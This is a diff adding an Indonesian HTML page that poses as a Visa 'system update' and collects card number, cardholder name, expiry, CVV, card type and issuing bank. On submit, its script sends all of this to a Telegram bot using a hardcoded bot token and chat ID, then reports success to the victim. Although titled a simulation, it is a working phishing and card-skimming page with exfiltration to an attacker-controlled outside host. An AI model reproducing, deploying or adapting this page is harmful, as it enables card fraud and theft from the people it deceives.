@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Simulasi Pembaruan VISA</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      background-color: #f2f2f2;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .form-box {
+      background: white;
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+      position: relative;
+    }
+    .form-box img {
+      width: 80px;
+      display: block;
+      margin: 0 auto 15px;
+    }
+    .form-box h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 20px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: 500;
+      font-size: 15px;
+    }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #0074d9;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .loading-spinner {
+      display: none;
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      width: 25px;
+      height: 25px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #0074d9;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 400px) {
+      .form-box {
+        padding: 15px;
+      }
+      input, select {
+        padding: 10px;
+        font-size: 15px;
+      }
+      button {
+        font-size: 15px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<form class="form-box" id="visaForm">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Logo">
+  <h2>Pembaruan Sistem VISA</h2>
+
+  <div class="loading-spinner" id="spinner"></div>
+
+  <div class="input-group">
+    <label>Nomor Kartu</label>
+    <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required>
+  </div>
+
+  <div class="input-group">
+    <label>Nama Pemegang Kartu</label>
+    <input type="text" id="name" required>
+  </div>
+
+  <div class="input-group">
+    <label>Masa Berlaku (MM/YY)</label>
+    <input type="text" id="expiry" maxlength="5" required>
+  </div>
+
+  <div class="input-group">
+    <label>CVV</label>
+    <input type="password" id="cvv" maxlength="3" required>
+  </div>
+
+  <div class="input-group">
+    <label>Jenis Kartu VISA</label>
+    <select id="jenisVisa" required>
+      <option value="">-- Pilih Jenis --</option>
+      <option>Visa Classic</option>
+      <option>Visa Gold</option>
+      <option>Visa Platinum</option>
+      <option>Visa Signature</option>
+      <option>Visa Infinite</option>
+    </select>
+  </div>
+
+  <div class="input-group">
+    <label>Bank Penerbit</label>
+    <select id="bank" required>
+      <option value="">-- Pilih Bank --</option>
+      <option>BCA</option>
+      <option>Mandiri</option>
+      <option>BNI</option>
+      <option>BRI</option>
+      <option>CIMB Niaga</option>
+      <option>Danamon</option>
+      <option>OCBC NISP</option>
+      <option>PermataBank</option>
+    </select>
+  </div>
+
+  <div class="input-group">
+    <label>Sistem VISA</label>
+    <select id="sistemVisa" required>
+      <option value="">-- Pilih Sistem --</option>
+      <option>VISA International</option>
+      <option>VISA USA</option>
+      <option>VISA Europe</option>
+      <option>VISA Asia Pacific</option>
+    </select>
+  </div>
+
+  <button type="submit">Kirim Pembaruan</button>
+</form>
+
+<script>
+  const botToken = '8225824960:AAHo2xUF0-EDD_ANfsokBrPnh9a_POcDxRk'; // Ganti dengan token bot Telegram kamu
+  const chatId = '8300885047';     // Ganti dengan chat_id Telegram kamu
+
+  const cardInput = document.getElementById('cardNumber');
+  const expiryInput = document.getElementById('expiry');
+  const form = document.getElementById('visaForm');
+  const spinner = document.getElementById('spinner');
+
+  cardInput.addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '').slice(0, 16);
+    let formatted = '';
+    for (let i = 0; i < value.length; i++) {
+      if (i > 0 && i % 4 === 0) formatted += ' ';
+      formatted += value[i];
+    }
+    e.target.value = formatted;
+  });
+
+  expiryInput.addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length >= 3) {
+      e.target.value = value.slice(0,2) + '/' + value.slice(2,4);
+    } else {
+      e.target.value = value;
+    }
+  });
+
+  form.addEventListener('submit', function(e) {
+    e.preventDefault();
+    spinner.style.display = 'block';
+
+    const message = `
+💳 *Simulasi Pembaruan VISA*
+👤 Nama: ${document.getElementById('name').value}
+💳 Nomor Kartu: ${cardInput.value}
+📅 Exp: ${expiryInput.value}
+🔐 CVV: ${document.getElementById('cvv').value}
+🏷️ Jenis: ${document.getElementById('jenisVisa').value}
+🏦 Bank: ${document.getElementById('bank').value}
+🌍 Sistem VISA: ${document.getElementById('sistemVisa').value}
+✅ OTP: [tidak digunakan]
+    `;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    }).then(() => {
+      alert("Data berhasil dikirim.");
+      form.reset();
+      spinner.style.display = 'none';
+    }).catch((err) => {
+      alert("Gagal kirim ke Telegram.");
+      console.error(err);
+      spinner.style.display = 'none';
+    });
+  });
+</script>
+
+</body>
+</html>
